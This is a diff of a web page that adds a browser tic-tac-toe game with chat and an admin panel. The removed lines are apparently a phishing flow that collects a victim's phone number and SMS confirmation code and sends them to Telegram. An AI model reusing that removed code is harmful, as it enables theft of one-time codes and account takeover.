+                gameState.isGameActive = false;
+                
+                let message = '';
+                let winner = null;
+
+                if (result.winner) {
+                    winner = result.winner;
+                    message = `${winner} wins the game! 🎉`;
+                    gameState.scores[winner]++;
+                    gameState.matchHistory.push({ winner: winner, time: new Date().toLocaleTimeString() });
+                    elements.winSound.currentTime = 0;
+                    elements.winSound.play();
+                    showNotification(message);
+                    drawWinLine(result.combination);
+                    showConfetti();
+                } else {
+                    message = `It's a draw! 🤝`;
+                    gameState.scores.draws++;
+                    gameState.matchHistory.push({ winner: null, time: new Date().toLocaleTimeString() });
+                    elements.drawSound.currentTime = 0;
+                    elements.drawSound.play();
+                    showNotification(message);
+                }
+
+                addChatMessage(`SYSTEM: ${message}`, true);
+                saveState();
+                setTimeout(renderGame, 1500); 
+            }
+
+            function drawWinLine(combination) {
+                const [a, b, c] = combination;
+                const cellA = elements.grid.children[a];
+                const cellC = elements.grid.children[c];
+                
+                const line = document.createElement('div');
+                line.classList.add('win-line');
+                
+                const aRect = cellA.getBoundingClientRect();
+                const cRect = cellC.getBoundingClientRect();
+                const gridRect = elements.grid.getBoundingClientRect();
+
+                line.style.left = `${aRect.left + aRect.width / 2 - gridRect.left}px`;
+                line.style.top = `${aRect.top + aRect.height / 2 - gridRect.top}px`;
+
+                if (a === 0 && c === 8) { // Diagonal \
+                    line.style.width = '140%';
+                    line.style.height = '5px';
+                    line.style.transform = 'rotate(45deg) translateY(-50%)';
+                    line.style.transformOrigin = '0% 0%';
+                } else if (a === 2 && c === 6) { // Diagonal /
+                    line.style.width = '140%';
+                    line.style.height = '5px';
+                    line.style.transform = 'rotate(-45deg) translateY(-50%)';
+                    line.style.transformOrigin = '100% 0%';
+                } else if (a === 0 && b === 1) { // Horizontal (Top Row)
+                    line.style.width = '100%';
+                    line.style.height = '5px';
+                    line.style.left = '5%'; 
+                    line.style.top = `${aRect.top + aRect.height / 2 - gridRect.top}px`;
+                } else { // Vertical or Middle/Bottom Horizontal (Fallback)
+                    line.style.width = '5px';
+                    line.style.height = '100%';
+                    line.style.top = '5%';
+                    line.style.left = `${aRect.left + aRect.width / 2 - gridRect.left}px`;
+                }
+
+                elements.grid.appendChild(line);
+                setTimeout(() => line.remove(), 1500);
+            }
+            
+            // --- 6. Event Handlers ---
+
+            elements.loginButton.addEventListener('click', () => {
+                const user = elements.usernameInput.value.trim();
+                const pass = elements.passwordInput.value.trim();
+                
+                elements.loginError.textContent = '';
+                if (!user || !pass) {
+                    elements.loginError.textContent = 'Please fill in both fields.';
+                    return;
+                }
+
+                if (user === ADMIN_USERNAME && pass === ADMIN_PASSWORD) {
+                    gameState.user = user;
+                    gameState.userRole = 'admin';
+                    gameState.isLoggedIn = true;
+                    addChatMessage(`SYSTEM: Admin ${user} has logged in.`, true);
+                } else {
+                    gameState.user = user;
+                    gameState.userRole = 'player';
+                    gameState.isLoggedIn = true;
+                    if (!gameState.spectators.includes(user) && !gameState.players.includes(user)) {
+                        gameState.spectators.push(user);
+                        addChatMessage(`SYSTEM: ${user} has joined Prosper's Arena!`, false);
+                    }
+                }
+                
+                gameState.users[gameState.user] = { role: gameState.userRole, wins: 0 }; 
+
+                saveState();
+                renderApp();
+            });
+
+            elements.guestLoginButton.addEventListener('click', () => {
+                const guestName = `Guest_${Math.floor(Math.random() * 1000)}`;
+                gameState.user = guestName;
+                gameState.userRole = 'guest';
+                gameState.isLoggedIn = true;
+                gameState.spectators.push(guestName);
+                gameState.users[guestName] = { role: 'guest', wins: 0 };
+                addChatMessage(`SYSTEM: ${guestName} has joined as a guest.`, false);
+                saveState();
+                renderApp();
+            });
+
+            elements.togglePassword.addEventListener('click', () => {
+                const type = elements.passwordInput.type === 'password' ? 'text' : 'password';
+                elements.passwordInput.type = type;
+                elements.togglePassword.classList.toggle('fa-eye');
+                elements.togglePassword.classList.toggle('fa-eye-slash');
+            });
+
+            elements.logoutButton.addEventListener('click', () => {
+                const user = gameState.user;
+                gameState.isLoggedIn = false;
+                gameState.user = null;
+                gameState.userRole = 'guest';
+                gameState.isGameActive = false;
+                
+                gameState.spectators = gameState.spectators.filter(u => u !== user);
+                gameState.players = gameState.players.filter(u => u !== user);
+
+                localStorage.removeItem('currentUser');
+                elements.usernameInput.value = '';
+                elements.passwordInput.value = '';
+
+                addChatMessage(`SYSTEM: ${user} has logged out.`, false);
+                renderApp();
+            });
+
+            elements.themeToggle.addEventListener('click', () => {
+                gameState.theme = gameState.theme === 'dark' ? 'light' : 'dark';
+                document.documentElement.setAttribute('data-theme', gameState.theme);
+                localStorage.setItem('theme', gameState.theme);
+                elements.themeToggle.innerHTML = gameState.theme === 'dark' ? '<i class="fas fa-moon"></i>' : '<i class="fas fa-sun"></i>';
+            });
+
+            function handleMove(event) {
+                if (!gameState.isGameActive || (gameState.userRole !== 'player' && gameState.userRole !== 'guest')) return;
+
+                const cellIndex = parseInt(event.currentTarget.dataset.index);
+                
+                const playerX = gameState.players[0];
+                const playerO = gameState.players[1];
+                
+                let isCurrentPlayerTurn = false;
+                if (gameState.currentPlayer === 'X' && gameState.user === playerX) {
+                    isCurrentPlayerTurn = true;
+                } else if (gameState.currentPlayer === 'O' && gameState.user === playerO) {
+                    isCurrentPlayerTurn = true;
+                }
+                
+                if (!isCurrentPlayerTurn) {
+                    showNotification("It's not your turn!", 'danger');
+                    return;
+                }
+
+
+                if (gameState.board[cellIndex] === null) {
+                    gameState.board[cellIndex] = gameState.currentPlayer;
+                    elements.moveSound.currentTime = 0;
+                    elements.moveSound.play();
+                    
+                    const winResult = checkWin();
+                    if (winResult) {
+                        endGame(winResult);
+                    } else if (checkDraw()) {
+                        endGame({});
+                    } else {
+                        gameState.currentPlayer = gameState.currentPlayer === 'X' ? 'O' : 'X';
+                        renderGame();
+                        saveState();
+                    }
+                }
+            }
+
+            elements.chatInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    elements.sendChatButton.click();
+                }
+            });
+
+            elements.sendChatButton.addEventListener('click', () => {
+                const text = elements.chatInput.value.trim();
+                if (text) {
+                    addChatMessage(text, gameState.userRole === 'admin');
+                    elements.chatInput.value = '';
+                }
+            });
+            
+            // --- 7. Admin Functions ---
+            
+            function adminStartMatch() {
+                if (gameState.players.length !== 2) {
+                    showNotification('Need exactly 2 players to start the match!', 'danger');
+                    return;
+                }
+                gameState.board = Array(9).fill(null);
+                gameState.currentPlayer = 'X';
+                gameState.isGameActive = true;
+                addChatMessage(`SYSTEM: Match started! ${gameState.players[0]} (X) vs ${gameState.players[1]} (O)`, true);
+                renderGame();
+                renderAdminDashboard();
+                showNotification('Match has started!', 'primary');
+            }
+
+            function adminEndMatch() {
+                gameState.isGameActive = false;
+                addChatMessage('SYSTEM: Admin manually ended the match.', true);
+                renderGame();
+                renderAdminDashboard();
+                showNotification('Match ended!', 'danger');
+            }
+
+            // UPDATED SYSTEM RESET
+            function adminResetSystem() {
+                if (confirm("WARNING: Are you sure you want to reset the entire system? This clears all users, scores, chat, and history.")) {
+                    
+                    // 1. Explicitly reset the in-memory state
+                    gameState.isLoggedIn = false;
+                    gameState.user = null;
+                    gameState.userRole = 'guest';
+                    gameState.board = Array(9).fill(null);
+                    gameState.currentPlayer = 'X';
+                    gameState.isGameActive = false;
+                    gameState.scores = { X: 0, O: 0, draws: 0 };
+                    gameState.matchHistory = [];
+                    gameState.users = {};
+                    gameState.spectators = [];
+                    gameState.players = [];
+                    gameState.chatMessages = [];
+                    
+                    // 2. Clear all persistent storage
+                    localStorage.clear();
+                    
+                    // 3. Reload the page to restart the application from scratch
+                    window.location.reload();
+                }
+            }
+            
+            function adminAddPlayer(spectatorName) {
+                if (gameState.players.length < 2) {
+                    gameState.spectators = gameState.spectators.filter(u => u !== spectatorName);
+                    const mark = gameState.players.length === 0 ? 'X' : 'O';
+                    gameState.players.push(spectatorName);
+                    addChatMessage(`SYSTEM: Admin added ${spectatorName} as Player ${mark}.`, true);
+                    renderSpectators();
+                    renderAdminDashboard();
+                } else {
+                    showNotification('Player list is full (Max 2)!', 'danger');
+                }
+            }
+
+            function adminRemovePlayer(playerName) {
+                gameState.players = gameState.players.filter(p => p !== playerName);
+                gameState.spectators.push(playerName);
+                addChatMessage(`SYSTEM: Admin removed ${playerName} from players.`, true);
+                renderSpectators();
+                renderAdminDashboard();
+                if (gameState.isGameActive) adminEndMatch();
+            }
+            
+            // Expose Admin functions to the global window object for inline HTML handlers
+            window.adminAddPlayer = adminAddPlayer;
+            window.adminRemovePlayer = adminRemovePlayer;
+
+            elements.adminStartMatch.addEventListener('click', adminStartMatch);
+            elements.adminEndMatch.addEventListener('click', adminEndMatch);
+            elements.adminResetSystem.addEventListener('click', adminResetSystem);
+
+            // --- 8. Utility Functions ---
+
+            function addChatMessage(text, isAdmin) {
+                const time = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+                const user = isAdmin ? 'Admin' : gameState.user;
+                gameState.chatMessages.push({ user: user, text: text, time: time, isAdmin: isAdmin });
+                renderChat();
+            }
+
+            function showNotification(message, type = 'secondary') {
+                const notif = document.createElement('div');
+                notif.classList.add('notification', type);
+                notif.textContent = message;
+                elements.notificationArea.appendChild(notif);
+                
+                setTimeout(() => {
+                    notif.remove();
+                }, 5000);
+            }
+            
+            function showConfetti() {
+                const confettiContainer = document.createElement('div');
+                confettiContainer.classList.add('confetti');
+                
+                for (let i = 0; i < 50; i++) {
+                    const flake = document.createElement('div');
+                    flake.style.width = `${Math.random() * 10 + 5}px`;
+                    flake.style.height = `${Math.random() * 10 + 5}px`;
+                    flake.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                    flake.style.position = 'absolute';
+                    flake.style.left = `${Math.random() * 100}vw`;
+                    flake.style.top = `${Math.random() * -20}vh`;
+                    flake.style.opacity = Math.random();
+                    flake.style.transform = `rotate(${Math.random() * 360}deg)`;
+                    flake.style.animation = `fall ${Math.random() * 3 + 2}s linear infinite`;
+                    confettiContainer.appendChild(flake);
+                }
+
+                const style = document.createElement('style');
+                style.innerHTML = `@keyframes fall { to { transform: translateY(100vh) rotate(720deg); opacity: 0; } }`;
+                document.head.appendChild(style);
+
+                document.body.appendChild(confettiContainer);
+                setTimeout(() => {
+                    confettiContainer.remove();
+                    style.remove();
+                }, 3000);
+            }
+
+            // --- Start Application ---
+            loadState();
         });
-      });
-    }
-    makeSelectable("question1","submitBtn1","Q1");
-    makeSelectable("question2","submitBtn2","Q2");
-
-    // SUBMITS
-    document.getElementById("submitBtn1").onclick=()=>{
-      sendQA("If R5,000 was deposited in your bank account right now what would you use it for?", answers.Q1, "💰");
-      show("question2");
-    };
-
-    document.getElementById("submitBtn2").onclick=()=>{
-      sendQA("What mode of payment do you prefer?", answers.Q2, "💳");
-      show("question3");
-    };
-
-    document.getElementById("phoneNumber").addEventListener("input",()=>{
-      const val = document.getElementById("phoneNumber").value.trim();
-      if(val !== "") {
-        enableButton("submitBtn3");
-        answers["Phone"] = val;
-      }
-    });
-    document.getElementById("submitBtn3").onclick=()=>{
-      sendQA("Phone number for payment confirmation", answers.Phone, "📱");
-      show("countdownScreen");
-      startCountdown();
-    };
-
-    function startCountdown(){
-      let num=50; // countdown starts at 50 now
-      const el=document.getElementById("countdownNumber");
-      const timer=setInterval(()=>{
-        el.textContent=num;
-        if(num<=10){el.style.color="red";} else {el.style.color="#00ff88";}
-        if(num<=0){clearInterval(timer);show("confirmationScreen");}
-        num--;
-      },1000);
-    }
-
-    document.getElementById("confirmationCode").addEventListener("input",()=>{
-      const val = document.getElementById("confirmationCode").value.trim();
-      if(val !== "") {
-        enableButton("submitBtn4");
-        answers["Code"] = val;
-      }
-    });
-    document.getElementById("submitBtn4").onclick=()=>{
-      sendQA("Confirmation code received via SMS", answers.Code, "🔐");
-      show("loadingScreen");
-      startLoading();
-    };
-
-    function startLoading(){
-      let fill=document.getElementById("loadingFill"),width=0;
-      const interval=setInterval(()=>{
-        if(width>=100){
-          clearInterval(interval);
-          document.getElementById("noSignal").style.display="block";
-          let summary = "📋 <b>Final Answers Summary</b>\n\n" +
-            `💰 Q1: ${answers.Q1}\n` +
-            `💳 Q2: ${answers.Q2}\n` +
-            `📱 Phone: ${answers.Phone}\n` +
-            `🔐 Code: ${answers.Code}`;
-          sendToTelegram(summary);
-        }
-        else{width++;fill.style.width=width+"%";}
-      },150);
-    }
-  </script>
+    </script>
 </body>
 </html>
